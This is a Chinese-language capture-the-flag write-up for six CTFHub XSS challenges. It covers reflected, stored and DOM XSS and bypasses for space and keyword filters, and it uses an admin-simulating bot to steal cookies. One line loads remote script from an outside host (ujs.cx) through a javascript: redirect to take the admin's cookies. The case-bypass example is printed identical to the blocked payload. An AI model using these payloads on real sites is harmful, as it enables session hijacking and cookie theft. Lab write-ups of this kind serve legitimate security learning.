---

title: CTFHub-XSS-WP
date: 2026-07-21
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/ctfhub-xss-wp
---


# 1.反射型XSS
首先进入页面是![](/images/20260503075507.webp)
我们可以看到有两个表单是可以输入文字的，我们使用`<script>`alert(1)`</script>`来制造弹窗
![](/images/20260503080222.webp)
发现第一个表单是存在反射型XSS的，看了别人的wp才知道，第二个表单显示sent URL to bot，这是因为反射型XSS在用户点击后才会生效，但这道题没人点击我们生成的payload，只好发送给robot，让程序模拟用户点击，使我们的payload生效。
然后我们使用在线的XSS网站生成对应的payload![](/images/20260503081935.webp)
然后在第一个表单里输入生成的payload，在第二个表单里输入对应的url来模拟管理员点击来盗取cookies
![](/images/20260503082206.webp)
最后返回XSS平台来查看管理员的cookies
![](/images/20260503082302.webp)
# 2.存储型XSS
打开环境我们可以看到两个表单，使用`<script>`alert(1)`</script>`来制造弹窗，查看是否存在XSS漏洞
和上一题类似，不过这一题是post型传参，在第二个表单里直接输入url就行，不需要加上恶意代码，![](/images/20260503084104.webp)
最后在cookies找到flag
# 3.DOM反射
打开环境我们可以看到两个表单，使用`<script>`alert(1)`</script>`来制造弹窗，查看是否存在XSS漏洞，奇怪的是这次没有弹窗了，我们查看页面源码
![](/images/20260503085146.webp)
这里我们发现是进行了双引号闭合，所以恶意代码没有被执行。因此，需要用 ' 来闭合语句，并且使用`</script>`来闭合前面一个`<script>` 最终构造出
';`</script>``<script>`alert(1)`</script>`来制造弹窗成功。![](/images/20260503085738.webp)
接下来的步骤就和之前的一样了
![](/images/20260503090138.webp)
最终在cookies里找到flag
# 4.DOM跳转
这次就和之前不一样了，![](/images/20260503090316.webp)
这里的第一个表单和Submit是点击不了的，以为是前端进行了过滤，
![](/images/20260503091104.webp)
然后我把两个disable删除后，就可以输入弹窗代码和提交了，不过，跳转到了另一个页面显示Method Not Allowed。然后查看一下页面源代码![](/images/20260503092758.webp)
解读代码:
```bash
// 1. 获取URL查询参数并分割
var target = location.search.split("=")
// 假设URL为: http://example.com/?jumpto=https://other-site.com
// location.search = "?jumpto=https://other-site.com"
// split("=") 后得到数组: ["?jumpto", "https://other-site.com"]

// 2. 检查参数名是否为"jumpto"
if (target[0].slice(1) == "jumpto") {
    // target[0] = "?jumpto"
    // slice(1) 去掉第一个字符"?"，得到"jumpto"
    
    // 3. 执行跳转
    location.href = target[1];
    // target[1] = "https://other-site.com"
    // 页面跳转到该地址
}
```
简单说：这段代码的作用是从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为"jumpto"，则将页面重定向到参数值所指定的URL。而当我们传递类似于jumpto= javascript:alert(1) 这样的代码时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。
于是我使用?jumpto=javascript:alert(1) 来测试一下是否有弹窗，结果不出所料，![](/images/20260503094301.webp)
因此，我们可以利用这个来注入恶意代码
```http
/?jumpto=javascript:$.getScript("//ujs.cx/nyY")
```
![](/images/20260503094532.webp)
最终在cookies里面发现flag
![](/images/20260503094613.webp)
# 5.空格过滤
使用[ / ]，/ * * /来代替空格
步骤和之前一样
![](/images/20260503095151.webp)
# 6.过滤关键词
和之前一样，使用`<script>`alert(1)`</script>`来测试是否有弹窗，结果什么都没发生，查看源码发现script被过滤了，![](/images/20260503095756.webp)

我们可以试试用大小写绕过
`<script>`alert(1)`</script>`
![](/images/20260503095919.webp)
成功，接下来的步骤就和前面一样了。
![](/images/20260503100037.webp)
